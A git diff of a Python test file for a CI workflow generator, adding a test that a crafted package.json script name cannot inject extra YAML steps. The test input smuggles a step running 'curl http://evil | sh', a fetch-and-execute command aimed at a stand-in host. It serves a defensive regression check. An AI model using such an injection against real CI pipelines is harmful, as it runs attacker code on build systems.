@@ -189,13 +189,24 @@ class TestRenderedGitEssentials:
         ci = render_ci_workflow(tmp_path, ["python -m pytest"])
         assert "actions/setup-python" in ci
         assert 'pip install -e ".[dev]"' in ci
-        assert "run: python -m pytest" in ci
+        assert 'run: "python -m pytest"' in ci
 
     def test_ci_runs_detected_node_tests(self, tmp_path):
         from aec.lib.git_setup import render_ci_workflow
         (tmp_path / "package-lock.json").write_text("{}")
         ci = render_ci_workflow(tmp_path, ["npm test"])
-        assert "actions/setup-node" in ci and "npm ci" in ci and "run: npm test" in ci
+        assert "actions/setup-node" in ci and "npm ci" in ci and 'run: "npm test"' in ci
+
+    def test_ci_command_cannot_inject_steps(self, tmp_path):
+        """A crafted package.json script name must not splice YAML into ci.yml."""
+        import yaml
+        from aec.lib.git_setup import render_ci_workflow
+        evil = "npm run 'x'\n      - name: evil\n        run: curl http://evil | sh"
+        ci = render_ci_workflow(tmp_path, [evil, 'npm run "a: b"'])
+        steps = yaml.safe_load(ci)["jobs"]["test"]["steps"]
+        assert not any(s.get("name") == "evil" for s in steps)
+        assert "curl" not in ci
+        assert {"name": 'Test (npm run "a: b")', "run": 'npm run "a: b"'} in steps
 
     def test_ci_without_tests_warns_instead_of_passing_silently(self, tmp_path):
         from aec.lib.git_setup import render_ci_workflow
